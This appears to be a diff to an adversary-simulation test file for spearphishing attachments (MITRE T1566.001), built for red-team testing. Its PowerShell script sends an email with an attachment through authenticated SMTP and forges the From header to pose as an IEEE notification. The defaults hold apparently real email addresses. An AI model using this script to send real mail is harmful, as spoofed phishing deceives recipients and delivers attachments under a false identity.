@@ -1,10 +1,10 @@
 attack_technique: T1566.001
 display_name: 'Phishing: Spearphishing Attachment'
 atomic_tests:
-  - name: Simulate sending a phishing email with a malicious attachment via SMTP
+  - name: Simulate sending a phishing email with a malicious attachment via SMTP with spoofed headers
     auto_generated_guid: custom-guid-phishing-attachment
     description: |
-      This test simulates sending a phishing email with a malicious attachment using PowerShell.
+      This test simulates sending a phishing email with a malicious attachment by spoofing headers instead of the From field.
       WARNING: THIS IS A SIMULATION AND SHOULD ONLY BE RUN IN A CONTROLLED ENVIRONMENT.
     supported_platforms:
       - windows
@@ -21,8 +21,8 @@ atomic_tests:
         description: Real email address for SMTP authentication (Return-Path)
         type: string
         default: "chaymaoumayma2003@gmail.com"  # Replace with your domain for Return-Path
-      sender_visible_email:
-        description: Email address visible in the "From" field (Spoofed)
+      spoofed_from_email:
+        description: Email address to spoof in the "From" header
         type: string
         default: "IEEE Notification <chaymabouattour@ieee.org>"  # Spoofed email address
       reply_to_email:
@@ -65,7 +65,7 @@ atomic_tests:
         $smtpServer = "#{smtp_server}"
         $smtpPort = "#{smtp_port}"
         $senderEmail = "#{sender_email}"  # Real address for SMTP authentication (Return-Path)
-        $senderVisibleEmail = "#{sender_visible_email}"  # Spoofed address in From: field
+        $spoofedFromEmail = "#{spoofed_from_email}"  # Spoofed address in the From header
         $replyTo = "#{reply_to_email}"  # Reply-To address
         $recipientEmail = "#{recipient_email}"
         $subject = "#{subject}"
@@ -74,18 +74,20 @@ atomic_tests:
         $securePassword = ConvertTo-SecureString "#{app_password}" -AsPlainText -Force
         $credential = New-Object System.Management.Automation.PSCredential($senderEmail, $securePassword)
         
-        # Custom headers to increase the spoofing realism
+        # Custom headers to spoof the From field and increase realism
         $headers = @{
+            "From" = $spoofedFromEmail  # Spoofed From header
             "X-Priority" = "1"  # High priority
             "X-MSMail-Priority" = "High"  # Mail priority
             "Importance" = "High"  # Importance level
         }
 
-        Write-Host "📧 Sending a phishing email with spoofed From header..."
+        Write-Host "📧 Sending a phishing email with spoofed headers..."
         try {
-            # Sending the email with spoofed From and customized headers
+            # Sending the email with spoofed headers
             Send-MailMessage -SmtpServer $smtpServer -Port $smtpPort -UseSsl `
-                -From $senderVisibleEmail -To $recipientEmail `
+                -From $senderEmail -To $recipientEmail `
+                -ReplyTo $replyTo `
                 -Subject $subject -BodyAsHtml $body `
                 -Attachments $attachmentPath -Credential $credential `
                 -Headers $headers -ErrorAction Stop
